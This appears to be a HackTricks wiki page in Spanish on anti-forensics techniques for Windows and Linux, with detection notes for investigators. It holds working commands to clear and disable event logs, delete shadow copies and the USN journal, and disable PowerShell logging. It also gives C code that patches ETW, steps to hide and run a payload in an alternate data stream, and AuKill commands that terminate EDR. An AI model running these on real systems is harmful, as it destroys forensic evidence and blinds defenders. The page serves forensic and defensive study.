# Técnicas Anti-forenses

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

Un atacante puede estar interesado en **cambiar las marcas de tiempo de los archivos** para evitar ser detectado.\
Es posible encontrar las marcas de tiempo dentro del MFT en los atributos `$STANDARD_INFORMATION` \_\_ y \_\_ `$FILE_NAME`.

Ambos atributos tienen 4 marcas de tiempo: **Modificación**, **acceso**, **creación** y **modificación del registro MFT** (MACE o MACB).

**Windows explorer** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.

### TimeStomp - Herramienta anti-forense

Esta herramienta **modifica** la información de la marca de tiempo dentro de **`$STANDARD_INFORMATION`** **pero** **no** la información dentro de **`$FILE_NAME`**. Por lo tanto, es posible **identificar** **actividad** **sospechosa**.

### Usnjrnl

El **USN Journal** (Journal de Número de Secuencia de Actualización) es una característica del NTFS (sistema de archivos de Windows NT) que rastrea los cambios en el volumen. La herramienta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite examinar estos cambios.

![](<../../images/image (801).png>)

La imagen anterior es la **salida** mostrada por la **herramienta** donde se puede observar que se **realizaron algunos cambios** en el archivo.

### $LogFile

**Todos los cambios de metadatos en un sistema de archivos se registran** en un proceso conocido como [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Los metadatos registrados se mantienen en un archivo llamado `**$LogFile**`, ubicado en el directorio raíz de un sistema de archivos NTFS. Herramientas como [LogFileParser](https://github.com/jschicht/LogFileParser) se pueden usar para analizar este archivo e identificar cambios.

![](<../../images/image (137).png>)

Nuevamente, en la salida de la herramienta es posible ver que **se realizaron algunos cambios**.

Usando la misma herramienta es posible identificar **a qué hora se modificaron las marcas de tiempo**:

![](<../../images/image (1089).png>)

- CTIME: Hora de creación del archivo
- ATIME: Hora de modificación del archivo
- MTIME: Modificación del registro MFT del archivo
- RTIME: Hora de acceso del archivo

### Comparación de `$STANDARD_INFORMATION` y `$FILE_NAME`

Otra forma de identificar archivos modificados sospechosos sería comparar el tiempo en ambos atributos buscando **inconsistencias**.

### Nanosegundos

Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Entonces, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.

### SetMace - Herramienta anti-forense

Esta herramienta puede modificar ambos atributos `$STARNDAR_INFORMATION` y `$FILE_NAME`. Sin embargo, desde Windows Vista, es necesario que un sistema operativo en vivo modifique esta información.

## Ocultamiento de Datos

NFTS utiliza un clúster y el tamaño mínimo de información. Eso significa que si un archivo ocupa y utiliza un clúster y medio, la **mitad restante nunca se va a utilizar** hasta que se elimine el archivo. Entonces, es posible **ocultar datos en este espacio de relleno**.

Hay herramientas como slacker que permiten ocultar datos en este espacio "oculto". Sin embargo, un análisis del `$logfile` y `$usnjrnl` puede mostrar que se añadieron algunos datos:

![](<../../images/image (1060).png>)

Entonces, es posible recuperar el espacio de relleno usando herramientas como FTK Imager. Tenga en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.

## UsbKill

Esta es una herramienta que **apagará la computadora si se detecta algún cambio en los puertos USB**.\
Una forma de descubrir esto sería inspeccionar los procesos en ejecución y **revisar cada script de python en ejecución**.

## Distribuciones de Linux en Vivo

Estas distribuciones se **ejecutan dentro de la memoria RAM**. La única forma de detectarlas es **en caso de que el sistema de archivos NTFS esté montado con permisos de escritura**. Si está montado solo con permisos de lectura, no será posible detectar la intrusión.

## Eliminación Segura

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Configuración de Windows

Es posible deshabilitar varios métodos de registro de Windows para dificultar mucho la investigación forense.

### Deshabilitar Marcas de Tiempo - UserAssist

Esta es una clave de registro que mantiene fechas y horas cuando cada ejecutable fue ejecutado por el usuario.

Deshabilitar UserAssist requiere dos pasos:

1. Establecer dos claves de registro, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` y `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, ambas a cero para señalar que queremos deshabilitar UserAssist.
2. Limpiar sus subárboles de registro que se parecen a `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Deshabilitar Marcas de Tiempo - Prefetch

Esto guardará información sobre las aplicaciones ejecutadas con el objetivo de mejorar el rendimiento del sistema Windows. Sin embargo, esto también puede ser útil para prácticas forenses.

- Ejecutar `regedit`
- Seleccionar la ruta del archivo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Hacer clic derecho en `EnablePrefetcher` y `EnableSuperfetch`
- Seleccionar Modificar en cada uno de estos para cambiar el valor de 1 (o 3) a 0
- Reiniciar

### Deshabilitar Marcas de Tiempo - Última Hora de Acceso

Cada vez que se abre una carpeta desde un volumen NTFS en un servidor Windows NT, el sistema toma el tiempo para **actualizar un campo de marca de tiempo en cada carpeta listada**, llamado la última hora de acceso. En un volumen NTFS muy utilizado, esto puede afectar el rendimiento.

1. Abra el Editor del Registro (Regedit.exe).
2. Navegue a `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Busque `NtfsDisableLastAccessUpdate`. Si no existe, agregue este DWORD y establezca su valor en 1, lo que deshabilitará el proceso.
4. Cierre el Editor del Registro y reinicie el servidor.

### Eliminar Historial de USB

Todas las **Entradas de Dispositivos USB** se almacenan en el Registro de Windows bajo la clave de registro **USBSTOR** que contiene subclaves que se crean cada vez que conecta un dispositivo USB a su PC o Laptop. Puede encontrar esta clave aquí `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Eliminando esto** eliminará el historial de USB.\
También puede usar la herramienta [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) para asegurarse de que los ha eliminado (y para eliminarlos).

Otro archivo que guarda información sobre los USB es el archivo `setupapi.dev.log` dentro de `C:\Windows\INF`. Este también debe ser eliminado.

### Deshabilitar Copias de Sombra

**Listar** copias de sombra con `vssadmin list shadowstorage`\
**Eliminarlas** ejecutando `vssadmin delete shadow`

También puede eliminarlas a través de la GUI siguiendo los pasos propuestos en [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Para deshabilitar las copias de sombra [pasos desde aquí](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Abra el programa de Servicios escribiendo "services" en el cuadro de búsqueda de texto después de hacer clic en el botón de inicio de Windows.
2. En la lista, busque "Copia de Sombra de Volumen", selecciónelo y luego acceda a Propiedades haciendo clic derecho.
3. Elija Deshabilitado en el menú desplegable "Tipo de inicio" y luego confirme el cambio haciendo clic en Aplicar y Aceptar.

También es posible modificar la configuración de qué archivos se van a copiar en la copia de sombra en el registro `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Sobrescribir archivos eliminados

- Puede usar una **herramienta de Windows**: `cipher /w:C` Esto indicará a cipher que elimine cualquier dato del espacio de disco no utilizado disponible dentro de la unidad C.
- También puede usar herramientas como [**Eraser**](https://eraser.heidi.ie)

### Eliminar registros de eventos de Windows

- Windows + R --> eventvwr.msc --> Expandir "Registros de Windows" --> Hacer clic derecho en cada categoría y seleccionar "Borrar Registro"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Deshabilitar registros de eventos de Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Dentro de la sección de servicios deshabilitar el servicio "Registro de Eventos de Windows"
- `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`

### Deshabilitar $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Registro Avanzado y Manipulación de Trazas (2023-2025)

### Registro de ScriptBlock/Module de PowerShell

Las versiones recientes de Windows 10/11 y Windows Server mantienen **ricos artefactos forenses de PowerShell** bajo
`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
Los atacantes pueden deshabilitarlos o borrarlos sobre la marcha:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Los defensores deben monitorear los cambios en esas claves del registro y la eliminación de eventos de PowerShell de alto volumen.

### Parche ETW (Event Tracing for Windows)

Los productos de seguridad de endpoints dependen en gran medida de ETW. Un método de evasión popular de 2024 es parchear `ntdll!EtwEventWrite`/`EtwEventWriteFull` en memoria para que cada llamada a ETW devuelva `STATUS_SUCCESS` sin emitir el evento:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (por ejemplo, `EtwTiSwallow`) implementan la misma primitiva en PowerShell o C++.  
Debido a que el parche es **local al proceso**, los EDR que se ejecutan dentro de otros procesos pueden pasarlo por alto.  
Detección: comparar `ntdll` en memoria vs. en disco, o enganchar antes del modo usuario.

### Revitalización de Flujos de Datos Alternativos (ADS)

Se han observado campañas de malware en 2023 (por ejemplo, cargadores **FIN12**) que han estado colocando binarios de segunda etapa dentro de ADS para mantenerse fuera de la vista de los escáneres tradicionales:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerar flujos con `dir /R`, `Get-Item -Stream *`, o Sysinternals `streams64.exe`. Copiar el archivo de host a FAT/exFAT o a través de SMB eliminará el flujo oculto y puede ser utilizado por los investigadores para recuperar la carga útil.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver se utiliza ahora rutinariamente para **anti-forensics** en intrusiones de ransomware. La herramienta de código abierto **AuKill** carga un controlador firmado pero vulnerable (`procexp152.sys`) para suspender o terminar los sensores EDR y forenses **antes de la encriptación y destrucción de registros**:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
El controlador se elimina después, dejando artefactos mínimos.  
Mitigaciones: habilitar la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/SAC) y alertar sobre la creación de servicios del kernel desde rutas escribibles por el usuario.

---

## Linux Anti-Forensics: Autoparcheo y C2 en la Nube (2023–2025)

### Autoparcheo de servicios comprometidos para reducir la detección (Linux)  
Los adversarios cada vez más "autoparchean" un servicio justo después de explotarlo para prevenir la re-explotación y suprimir las detecciones basadas en vulnerabilidades. La idea es reemplazar componentes vulnerables con los últimos binarios/JARs legítimos de upstream, de modo que los escáneres informen que el host está parcheado mientras la persistencia y C2 permanecen.

Ejemplo: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- Después de la explotación, los atacantes obtuvieron JARs legítimos de Maven Central (repo1.maven.org), eliminaron JARs vulnerables en la instalación de ActiveMQ y reiniciaron el broker.  
- Esto cerró el RCE inicial mientras mantenía otros puntos de apoyo (cron, cambios en la configuración de SSH, implantes C2 separados).

Ejemplo operativo (ilustrativo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forense/caza consejos
- Revise los directorios de servicios en busca de reemplazos binarios/JAR no programados:
- Debian/Ubuntu: `dpkg -V activemq` y compare los hashes/rutas de archivos con los espejos del repositorio.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Busque versiones de JAR presentes en el disco que no sean propiedad del gestor de paquetes, o enlaces simbólicos actualizados fuera de banda.
- Línea de tiempo: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` para correlacionar ctime/mtime con la ventana de compromiso.
- Historial de shell/telemetría de procesos: evidencia de `curl`/`wget` a `repo1.maven.org` u otros CDN de artefactos inmediatamente después de la explotación inicial.
- Gestión de cambios: valide quién aplicó el “parche” y por qué, no solo que una versión parcheada esté presente.

### C2 de servicio en la nube con tokens de portador y stagers anti-análisis
El comercio observado combinó múltiples rutas C2 de largo alcance y empaquetado anti-análisis:
- Cargadores ELF de PyInstaller protegidos por contraseña para dificultar el sandboxing y el análisis estático (por ejemplo, PYZ cifrado, extracción temporal bajo `/_MEI*`).
- Indicadores: hits de `strings` como `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefactos en tiempo de ejecución: extracción a `/tmp/_MEI*` o rutas personalizadas `--runtime-tmpdir`.
- C2 respaldado por Dropbox utilizando tokens de portador OAuth codificados.
- Marcadores de red: `api.dropboxapi.com` / `content.dropboxapi.com` con `Authorization: Bearer <token>`.
- Cace en proxy/NetFlow/Zeek/Suricata para HTTPS saliente a dominios de Dropbox desde cargas de trabajo de servidor que normalmente no sincronizan archivos.
- C2 paralelo/respaldo a través de túneles (por ejemplo, Cloudflare Tunnel `cloudflared`), manteniendo el control si un canal es bloqueado.
- IOCs de host: procesos/unidades `cloudflared`, configuración en `~/.cloudflared/*.json`, saliente 443 a los bordes de Cloudflare.

### Persistencia y “rollback de endurecimiento” para mantener el acceso (ejemplos de Linux)
Los atacantes a menudo combinan auto-parcheo con rutas de acceso duraderas:
- Cron/Anacron: ediciones al stub `0anacron` en cada directorio `/etc/cron.*/` para ejecución periódica.
- Cace:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback de endurecimiento de configuración SSH: habilitar inicios de sesión de root y alterar shells predeterminados para cuentas de bajo privilegio.
- Cace para habilitar el inicio de sesión de root:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# valores de bandera como "yes" o configuraciones excesivamente permisivas
```
- Cace para shells interactivas sospechosas en cuentas del sistema (por ejemplo, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artefactos de beacon aleatorios y de nombre corto (8 caracteres alfabéticos) dejados en el disco que también contactan C2 en la nube:
- Cace:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Los defensores deben correlacionar estos artefactos con la exposición externa y los eventos de parcheo de servicios para descubrir la auto-remediación anti-forense utilizada para ocultar la explotación inicial.

## Referencias

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (marzo de 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (junio de 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
